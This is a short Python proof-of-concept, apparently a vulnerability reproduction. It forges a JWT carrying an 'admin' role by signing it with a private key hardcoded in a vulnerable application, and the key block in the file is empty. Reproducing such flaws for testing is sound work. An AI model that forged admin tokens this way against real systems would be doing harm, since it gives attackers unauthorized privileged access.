import jwt
import datetime

# Hardcoded private key from the vulnerable code
private_key = '''-----BEGIN RSA PRIVATE KEY-----

-----END RSA PRIVATE KEY-----'''

# Function to create a JWT token using the hardcoded private key
def create_jwt_token():
    try:
        # Define payload with a sample user data
        payload = {
            'data': {
                'id': '123',
                'role': 'admin',  # Assigning admin role to demonstrate privilege escalation
                'email': 'admin@example.com'
            },
            'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=6)  # Token expiration
        }

        # Create JWT token using RS256 algorithm
        token = jwt.encode(payload, private_key, algorithm='RS256')
        return token
    except Exception as e:
        print(f"Error creating JWT token: {e}")
        return None

# Main function to demonstrate the vulnerability
def main():
    # Create a JWT token
    token = create_jwt_token()

    # Check if token creation was successful
    if token:
        print("VULNERABILITY TRIGGERED")
    else:
        print("Failed to trigger vulnerability")

# Execute the main function
if __name__ == "__main__":
    main()
